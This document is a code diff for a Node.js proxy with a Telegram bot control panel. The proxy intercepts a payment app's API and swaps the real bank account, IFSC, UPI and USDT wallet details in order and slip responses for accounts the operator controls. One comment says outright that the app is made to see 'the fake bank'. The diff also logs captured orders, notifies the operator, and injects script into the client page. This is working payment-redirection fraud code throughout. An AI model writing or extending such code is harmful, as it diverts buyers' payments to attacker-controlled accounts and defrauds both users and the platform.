+    if (text === '/banks') {
+      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks.'); return res.sendStatus(200); }
       await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
       return res.sendStatus(200);
     }
 
-    if (cmd === '/orders') {
-      data = await loadData(true);
+    if (text === '/orders') {
       if (!data.orderBankMap || Object.keys(data.orderBankMap).length === 0) {
         await bot.sendMessage(chatId, '📋 No saved orders.');
         return res.sendStatus(200);
@@ -1082,12 +869,13 @@ Example:
       const manualOrders = [];
       const seen = new Set();
       for (const [orderId, orderData] of Object.entries(data.orderBankMap)) {
-        if (!orderData.isManual) continue;
+        if (!orderData.isManual) continue; // Only list manually added orders
         const uniqueKey = orderData.rptNo || orderId;
         if (seen.has(uniqueKey)) continue;
         seen.add(uniqueKey);
         manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${orderData.bank}\n`);
       }
+
       let m = `📋 Saved Orders (${manualOrders.length}):\n\n`;
       for (const ord of manualOrders) {
         m += ord + '\n';
@@ -1096,13 +884,12 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (cmd === '/addorder') {
-      const parts = cmdArgs.split('|').map(s => s.trim());
+    if (text.startsWith('/addorder ')) {
+      const parts = text.substring(10).split('|').map(s => s.trim());
       if (parts.length < 2) {
         await bot.sendMessage(chatId, '❌ Format: /addorder <OrderNo> | <BankNumber>\nExample: /addorder 5524954159126535 | 1');
         return res.sendStatus(200);
       }
-      data = await loadData(true);
       const orderNo = parts[0];
       const bankIdx = parseInt(parts[1]) - 1;
 
@@ -1136,32 +923,34 @@ Example:
         rptNo: orderNo,
         orderNo: orderNo,
         walletDomain: wDomain,
-        payType: 1,
+        payType: 1, // Assume bank transfer for manual for now
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         userId: 'manual',
         forced: true,
-        isManual: true
+        isManual: true // Flag to identify manually added orders
       };
 
-      data = await saveSettings({ orderBankMap: data.orderBankMap });
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId, `✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/delorder') {
-      const orderNo = cmdArgs.trim();
-      data = await loadData(true);
+    if (text.startsWith('/delorder ')) {
+      const orderNo = text.substring(10).trim();
       if (!data.orderBankMap) {
         await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
         return res.sendStatus(200);
       }
 
       let deleted = false;
+      // Delete any key that matches orderNo directly
       if (data.orderBankMap[orderNo]) {
         delete data.orderBankMap[orderNo];
         deleted = true;
       }
 
+      // Also delete any other keys that point to the same order object
       for (const [k, v] of Object.entries(data.orderBankMap)) {
         if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
           delete data.orderBankMap[k];
@@ -1174,75 +963,67 @@ Example:
         return res.sendStatus(200);
       }
 
-      data = await saveSettings({ orderBankMap: data.orderBankMap });
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId, `🗑️ Removed order mapping for: ${orderNo}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/addbank') {
-      const parts = cmdArgs.split('|').map(s => s.trim());
+    if (text.startsWith('/addbank ')) {
+      const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
-      data = await loadData(true);
-      if (!data.banks) data.banks = [];
-      if (data.banks.length >= 20) { await bot.sendMessage(chatId, '❌ Max banks reached.'); return res.sendStatus(200); }
+      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
       const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
       data.banks.push(nb);
       if (data.activeIndex < 0) data.activeIndex = 0;
-      data = await saveSettings({ banks: data.banks, activeIndex: data.activeIndex });
+      data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/removebank') {
-      const idx = parseInt(cmdArgs) - 1;
-      data = await loadData(true);
-      if (isNaN(idx) || idx < 0 || !data.banks || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
+    if (text.startsWith('/removebank ')) {
+      const idx = parseInt(text.substring(12).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
       const removed = data.banks.splice(idx, 1)[0];
       if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
       else if (data.activeIndex > idx) data.activeIndex--;
-      data = await saveSettings({ banks: data.banks, activeIndex: data.activeIndex });
+      data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/setbank') {
-      const idx = parseInt(cmdArgs) - 1;
-      data = await loadData(true);
-      if (isNaN(idx) || idx < 0 || !data.banks || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
-      data = await saveSettings({ activeIndex: idx });
-      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
+    if (text.startsWith('/setbank ')) {
+      const idx = parseInt(text.substring(9).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
+      data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, `✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/setmin') {
+    if (text.startsWith('/setmin ')) {
       data = await loadData(true);
-      const parts = cmdArgs.split(/\s+/);
+      const parts = text.substring(8).trim().split(/\s+/);
       const bankIdx = parseInt(parts[0]) - 1;
       const amount = parseFloat(parts[1]);
-      if (isNaN(bankIdx) || bankIdx < 0 || !data.banks || bankIdx >= data.banks.length || isNaN(amount) || amount < 0) {
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount) || amount < 0) {
         await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500\n\nBank replace sirf tabhi hoga jab buy amount >= set amount');
         return res.sendStatus(200);
       }
       data.banks[bankIdx].minAmount = amount;
-      data = await saveSettings({ banks: data.banks });
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId, amount === 0
         ? `✅ Bank #${bankIdx + 1} ka min amount remove kiya — ab saari amounts pe bank replace hoga`
         : `✅ Bank #${bankIdx + 1} min amount: ₹${amount}\nAb sirf ₹${amount}+ ke buy orders pe bank replace hoga`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/usdt') {
-      const addr = cmdArgs.trim();
-      data = await loadData(true);
-      if (addr.toLowerCase() === 'off') {
-        data = await saveSettings({ usdtAddress: '' });
-        await bot.sendMessage(chatId, '❌ USDT override OFF');
-      } else if (addr.length >= 20) {
-        data = await saveSettings({ usdtAddress: addr });
-        await bot.sendMessage(chatId, `₮ USDT set to: ${addr}`);
-      } else {
-        await bot.sendMessage(chatId, '❌ Invalid address. Format: /usdt <address> or /usdt off');
-      }
+    if (text.startsWith('/usdt ')) {
+      const addr = text.substring(6).trim();
+      if (addr.toLowerCase() === 'off') { data.usdtAddress = ''; } else if (addr.length >= 20) { data.usdtAddress = addr; }
+      else { await bot.sendMessage(chatId, '❌ Invalid address.'); return res.sendStatus(200); }
+      data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
       return res.sendStatus(200);
     }
 
@@ -1321,11 +1102,6 @@ function sendJson(res, headers, json, fallbackBody) {
   const body = json ? JSON.stringify(json) : fallbackBody;
   headers['content-type'] = 'application/json; charset=utf-8';
   headers['content-length'] = String(Buffer.byteLength(body));
-  headers['access-control-allow-origin'] = '*';
-  headers['access-control-allow-credentials'] = 'true';
-  headers['access-control-allow-headers'] = '*';
-  headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD';
-  headers['cache-control'] = 'no-cache, no-store, max-age=0, must-revalidate';
   res.writeHead(200, headers);
   res.end(body);
 }
@@ -1561,9 +1337,13 @@ app.all('/xxapi/*', async (req, res) => {
     }
 
     // ── paymentslipdetail / order detail intercept — serve from orderBankMap if backend 404s ──
-    const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') ||
+const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
+      urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') ||
       urlLower.includes('slipdetail') || urlLower.includes('orderdetail') || urlLower.includes('order_detail') ||
-      urlLower.includes('buydetail') || urlLower.includes('buy_detail'));
+      urlLower.includes('buydetail') || urlLower.includes('buy_detail') ||
+      (urlLower.includes('buyitoken') && (urlLower.includes('/detail') || urlLower.includes('_detail') ||
+        urlLower.includes('/orderinfo') || urlLower.includes('/order_info') || urlLower.includes('/getorder')))
+    );
     if (isSlipDetail && !proxyRes) {
       proxyRes = await proxyToTivox(req);
       const { response: sd, respBody: sb2, respHeaders: sh2 } = proxyRes;
@@ -1581,6 +1361,14 @@ app.all('/xxapi/*', async (req, res) => {
         if (!slipId && req.body) {
           for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
             slipId = slipId || req.body[f] || '';
+          }
+        }
+        // Some detail calls put the order number in the URL path instead of
+        // query/body parameters, so use the last numeric path segment as fallback.
+        if (!slipId) {
+          const pathParts = (req.originalUrl || req.url).split(/[/?#]/).filter(Boolean);
+          for (let i = pathParts.length - 1; i >= 0; i--) {
+            if (/^\d{3,}$/.test(pathParts[i])) { slipId = pathParts[i]; break; }
           }
         }
         const savedSlip = slipId ? data.orderBankMap[String(slipId)] : null;
@@ -1616,7 +1404,26 @@ app.all('/xxapi/*', async (req, res) => {
           return res.status(200).json(slipResp);
         }
       }
-      // If backend responded fine, let the unified pipeline handle full replacement
+      // If backend responded fine, we still need to replace bank details!
+      if (!slipFailed && sj2 && sj2.data) {
+        const activeBank = getActiveBank(data, null);
+        if (activeBank) {
+          forceBankDetails(sj2.data, activeBank);
+
+          if (activeBank.bankName) {
+            sj2.data.bankName = activeBank.bankName;
+            if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
+            if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
+          }
+
+          // Stringify the updated JSON and update headers
+          const newBody = JSON.stringify(sj2);
+          sh2['content-length'] = String(Buffer.byteLength(newBody));
+          res.writeHead(sd.status, sh2);
+          return res.end(newBody);
+        }
+      }
+      // If no active bank or didn't replace, just let the main pipeline handle it
     }
 
     // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
@@ -1860,8 +1667,9 @@ app.all('/xxapi/*', async (req, res) => {
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
         const activeBank = getActiveBank(data, null);
 
-        if (data.botEnabled !== false) {
+        if (activeBank && data.botEnabled !== false) {
           for (const order of orderList) {
+            const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
             const amt = getOrderAmount(req, order);
             const orderIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo'];
             let orderId = '';
@@ -1879,66 +1687,62 @@ app.all('/xxapi/*', async (req, res) => {
             }
             const altId = order.orderNo || order.rptNo || '';
 
-            // Find target bank (saved in orderBankMap if forced/manual or fallback to activeBank)
-            const targetBank = resolveTargetBank(data, orderId, altId, activeBank);
+            if (isPaying && orderId && amt !== null) {
+              if (!activeBank.minAmount || amt >= activeBank.minAmount) {
+                // Mutate the JSON response directly so the app sees the fake bank
+                const bkAcctC1 = activeBank.accountNo || '';
+                const bkIfscC1 = activeBank.ifsc || '';
+                const bkNameC1 = activeBank.accountHolder || '';
+                const last4C1 = bkAcctC1.slice(-4);
+                let pt = order.payType || order.ctType || 1;
+                if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
+                const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
 
-            if (targetBank) {
-              const bkAcctC1 = targetBank.accountNo || '';
-              const bkIfscC1 = targetBank.ifsc || '';
-              const bkNameC1 = targetBank.accountHolder || '';
-              const last4C1 = bkAcctC1.slice(-4);
-              let pt = order.payType || order.ctType || 1;
-              if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
-              const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt || 0}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
+                const hasBank = scanHasBankFields(order, 0);
+                if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
 
-              // Unconditionally replace all bank & payment fields on the history order item
-              replaceOrderBankDetails(order, targetBank);
+                if (wDomC1) order.walletDomain = wDomC1;
+                if (activeBank.bankName) order.bankName = activeBank.bankName;
 
-              if (wDomC1) order.walletDomain = wDomC1;
+                if (!data.orderBankMap) data.orderBankMap = {};
+                if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
+                  const savedData = {
+                    bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                    accountHolder: bkNameC1,
+                    accountNo: bkAcctC1,
+                    ifsc: bkIfscC1,
+                    bankName: activeBank.bankName || '',
+                    upiId: activeBank.upiId || '',
+                    amount: amt,
+                    rptNo: orderId,
+                    orderNo: altId || orderId,
+                    walletDomain: wDomC1,
+                    payType: pt,
+                    time: now,
+                    userId: String(userId || ''),
+                    forced: true,
+                    isManual: true
+                  };
 
-              // Only auto-capture & notify admin if the order is actively being paid
-              const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
-              if (isPaying && orderId && amt !== null) {
-                if (!targetBank.minAmount || amt >= targetBank.minAmount) {
-                  if (!data.orderBankMap) data.orderBankMap = {};
-                  if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
-                    const savedData = {
-                      bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
-                      accountHolder: bkNameC1,
-                      accountNo: bkAcctC1,
-                      ifsc: bkIfscC1,
-                      bankName: targetBank.bankName || '',
-                      upiId: targetBank.upiId || '',
-                      amount: amt,
-                      rptNo: orderId,
-                      orderNo: altId || orderId,
-                      walletDomain: wDomC1,
-                      payType: pt,
-                      time: now,
-                      userId: String(userId || ''),
-                      forced: true,
-                      isManual: true
-                    };
+                  data.orderBankMap[String(orderId)] = savedData;
+                  if (altId && altId !== orderId) {
+                    data.orderBankMap[String(altId)] = savedData;
+                  }
 
-                    data.orderBankMap[String(orderId)] = savedData;
+                  // Persist the auto-captured order immediately so /orders sees it
+                  saveData(data).catch(() => { });
+
+                  if (!data.orderBankMap[String(orderId)].notified) {
+                    data.orderBankMap[String(orderId)].notified = true;
                     if (altId && altId !== orderId) {
-                      data.orderBankMap[String(altId)] = savedData;
+                      data.orderBankMap[String(altId)].notified = true;
                     }
-
-                    saveData(data).catch(() => { });
-
-                    if (!data.orderBankMap[String(orderId)].notified) {
-                      data.orderBankMap[String(orderId)].notified = true;
-                      if (altId && altId !== orderId) {
-                        data.orderBankMap[String(altId)].notified = true;
-                      }
-                      notifyAdmin(data,
-                        `✅ AUTO-CAPTURED FROM HISTORY
+                    notifyAdmin(data,
+                      `✅ AUTO-CAPTURED FROM HISTORY
 💰 Amount: ₹${amt}
 📋 Order: ${orderId}
 💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
 🕐 ${now}`);
-                    }
                   }
                 }
               }
@@ -2023,80 +1827,6 @@ app.all('/xxapi/*', async (req, res) => {
         `🔔 NEW BILL\n👤 User: ${userId || 'N/A'}${billInfo}\n🕐 ${now}`);
     }
 
-    // ── Payment Proof & Slip Interceptor (ONLY sends when actual photo/screenshot exists) ────
-    const isProofUpload = req.method === 'POST' && (urlLower.includes('uploadpaymentproof') || urlLower.includes('uploadproof'));
-    if (isProofUpload) {
-      let proofOrderId = '';
-      const proofMatch = (req.originalUrl || req.url).match(/\/(?:uploadPaymentProof|uploadproof)\/([a-zA-Z0-9_-]+)/i);
-      if (proofMatch && proofMatch[1]) proofOrderId = proofMatch[1];
-      if (!proofOrderId && respData && typeof respData === 'object') {
-        proofOrderId = respData.rptNo || respData.orderId || respData.orderNo || respData.id || '';
-      }
-      if (!proofOrderId && req.body) {
-        proofOrderId = req.body.rptNo || req.body.orderId || req.body.orderNo || req.body.id || '';
-      }
-
-      // Check if response contains proof payment image path
-      let proofPath = '';
-      if (respData && typeof respData === 'object') {
-        proofPath = respData.proof_payment || respData.proofPayment || respData.proofUrl || respData.imageUrl || respData.image || '';
-      }
-      if (!proofPath && jsonResp && typeof jsonResp === 'object') {
-        const d = jsonResp.data || jsonResp.result;
-        if (d && typeof d === 'object') {
-          proofPath = d.proof_payment || d.proofPayment || d.proofUrl || d.imageUrl || '';
-        }
-      }
-
-      // Format full image URL if relative path returned
-      let fullProofUrl = '';
-      if (proofPath && typeof proofPath === 'string') {
-        if (proofPath.startsWith('http')) fullProofUrl = proofPath;
-        else fullProofUrl = `https://vivipay.net/images/${proofPath.replace(/^\/+/, '')}`;
-      }
-
-      // Check if base64 image was uploaded in request body
-      let imgBuffer = null;
-      if (req.rawBody) {
-        const rawStr = req.rawBody.toString('utf-8');
-        const b64Match = rawStr.match(/data:image\/(?:png|jpeg|jpg|webp);base64,([A-Za-z0-9+/=]+)/);
-        if (b64Match && b64Match[1]) {
-          try { imgBuffer = Buffer.from(b64Match[1], 'base64'); } catch (e) { }
-        }
-      }
-
-      // ONLY proceed if an actual photo/screenshot is present
-      const hasImage = (imgBuffer && Buffer.isBuffer(imgBuffer) && imgBuffer.length > 0) || !!fullProofUrl;
-      if (hasImage) {
-        const dedupeKey = proofOrderId || `${userId}_${Date.now()}`;
-        const lastSent = _lastProofTimes.get(dedupeKey) || 0;
-        const nowMs = Date.now();
-
-        if (nowMs - lastSent > 15000) { // 15s debounce
-          _lastProofTimes.set(dedupeKey, nowMs);
-
-          let mappedBankInfo = '';
-          let orderAmt = '';
-          if (proofOrderId && data.orderBankMap && data.orderBankMap[String(proofOrderId)]) {
-            const saved = data.orderBankMap[String(proofOrderId)];
-            if (saved.bank) mappedBankInfo = `\n🏦 Mapped Bank: ${saved.bank}`;
-            if (saved.amount) orderAmt = `\n💰 Amount: ₹${saved.amount}`;
-          }
-
-          const captionText = `🧾 PAYMENT PROOF SUBMITTED
-👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${proofOrderId ? '\n📋 Order: ' + proofOrderId : ''}${orderAmt}${mappedBankInfo}
-📊 Status: ${response.status === 200 ? '✅ Uploaded (200 OK)' : '⚠️ Status ' + response.status}
-🕐 ${now}`;
-
-          if (imgBuffer && Buffer.isBuffer(imgBuffer) && imgBuffer.length > 0) {
-            notifyAdminPhoto(data, imgBuffer, captionText);
-          } else if (fullProofUrl) {
-            notifyAdminPhoto(data, fullProofUrl, captionText);
-          }
-        }
-      }
-    }
-
     if (urlLower.includes('waitconfirm')) {
       if (respData && Array.isArray(respData.waitconfirm)) {
         for (const wc of respData.waitconfirm) {
@@ -2136,7 +1866,7 @@ app.all('/xxapi/*', async (req, res) => {
 
               if (!alreadyNotified) {
                 if (data.orderBankMap[String(rptNo)]) {
-                  data.orderBankMap[String(rptNo)].notified = true;
+                    data.orderBankMap[String(rptNo)].notified = true;
                 }
                 // ALWAYS notify admin that the Go Pay popup was triggered
                 notifyAdmin(data,
@@ -2188,15 +1918,32 @@ app.all('/xxapi/*', async (req, res) => {
         function _replaceListItems(list) {
           list.forEach(item => {
             if (!item || typeof item !== 'object') return;
-            const oId = _getItemOId(item);
-            const altOId = item.orderNo || item.rptNo || '';
-            const targetBank = resolveTargetBank(data, oId, altOId, bank);
+            const orderState = parseInt(item.orderState ?? item.state ?? -1);
+            const isHistoryItem = orderState > 0;
 
-            if (targetBank) {
+            const oId = _getItemOId(item);
+            const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
+
+            if (!isHistoryItem) {
+              // Browse (available to buy): minAmount check
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
 
-              replaceOrderBankDetails(item, targetBank);
+              // Blanket replace for active browse items
+              const hasAcct = scanHasBankFields(item, 0);
+              if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
+            } else {
+              // History/detail items must use the same replacement as the active
+              // text/list view. Prefer an explicitly mapped order bank, but fall
+              // back to the currently active bank when the order was not mapped.
+              const mappedBank = savedSlip && savedSlip.isManual ? {
+                accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
+                accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
+                ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
+                bankName: savedSlip.bankName || bank.bankName || 'Bank',
+                upiId: savedSlip.upiId || bank.upiId || ''
+              } : bank;
+              forceBankDetails(item, mappedBank);
             }
           });
         }
@@ -2217,10 +1964,12 @@ app.all('/xxapi/*', async (req, res) => {
             }
           }
           if (shouldReplace) {
-            replaceOrderBankDetails(jsonResp, bank);
-            if (respData && typeof respData === 'object') replaceOrderBankDetails(respData, bank);
-            _bankReplaced = true;
-            _replacedBank = bank;
+            const globalHasAcct = scanHasBankFields(jsonResp, 0);
+            if (globalHasAcct) {
+              deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+              _bankReplaced = true;
+              _replacedBank = bank;
+            }
           }
         }
       }
@@ -2276,7 +2025,7 @@ app.all('/xxapi/*', async (req, res) => {
       } else {
         replaceLine = `❌ NOT Replaced (no active bank)`;
       }
-
+      
       // Determine if order was actually replaced or just not replaced due to min amount
       // Also ensure we only notify ONCE per order.
       const alreadyNotified = _orderId && data.orderBankMap && data.orderBankMap[_orderId] && data.orderBankMap[_orderId].notified;
@@ -2377,10 +2126,9 @@ ${replaceLine}
           const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
           const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';
 
-          // Store real history snapshot separately for logging without corrupting orderBankMap
-          if (!data.realHistoryMap) data.realHistoryMap = {};
-          if (!data.realHistoryMap[oId]) {
-            data.realHistoryMap[oId] = {
+          // Don't overwrite entries that were forced by our proxy (forced=true)
+          if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
+            data.orderBankMap[oId] = {
               bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
               amount: parseFloat(amt) || 0,
               rptNo: item.rptNo || item.rpt_no || oId,
@@ -2388,6 +2136,11 @@ ${replaceLine}
               time: now,
               userId: userId || ''
             };
+            // Also index by rptNo if different from orderNo
+            const altId = item.rptNo || item.rpt_no || '';
+            if (altId && altId !== oId && (!data.orderBankMap[altId] || !data.orderBankMap[altId].forced)) {
+              data.orderBankMap[altId] = data.orderBankMap[oId];
+            }
           }
 
           // Check if we have already notified about this specific order ID
@@ -2428,9 +2181,7 @@ ${replaceLine}
       now
     }).catch(() => { });
 
-    const curBank = getActiveBank(data, userId);
-    const defBankName = (curBank && curBank.bankName) ? curBank.bankName : ((curBank && curBank.ifsc) ? getBankNameFromIfsc(curBank.ifsc) : 'Bank');
-    if (jsonResp) cleanUglyBankNames(jsonResp, 0, defBankName);
+    if (jsonResp) cleanUglyBankNames(jsonResp);
     sendJson(res, respHeaders, jsonResp);
 
   } catch (e) {
@@ -2581,12 +2332,8 @@ if(!window.xamlAction){
         if(action==='getDeviceInfo')return window.xamlAction.getDeviceInfo();
         if(action==='closeWebview'){window.history.back();return '';}
         if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
-        var bName=(CFG&&CFG.bn)||'Bank';
-        if(action==='getBankName'||action==='getBank'||action==='queryBank'||action==='getBankByIfsc'||action==='bankName'){
-          return bName;
-        }
-        return bName;
-      }catch(e){return (CFG&&CFG.bn)||'Bank';}
+        return JSON.stringify({code:0,msg:'ok',data:{}});
+      }catch(e){return JSON.stringify({code:0,msg:'ok',data:{}});}
     }
   };
 }
@@ -2642,25 +2389,7 @@ if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
 try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
 for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
 
-function patchBankDOM(){
-  if(!document.body)return;
-  var bName=(CFG&&CFG.bn)||'Bank';
-  var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
-  var toFix=[];
-  while(walker.nextNode()){
-    var nd=walker.currentNode;
-    var txt=(nd.textContent||'').trim();
-    if(txt.indexOf('{"code":')!==-1||txt.indexOf('"msg":')!==-1||txt.indexOf('"data":')!==-1){
-      toFix.push(nd);
-    }
-  }
-  for(var i=0;i<toFix.length;i++){
-    toFix[i].textContent=bName;
-  }
-}
-
 function patchBalDOM(){
-  patchBankDOM();
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
 var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
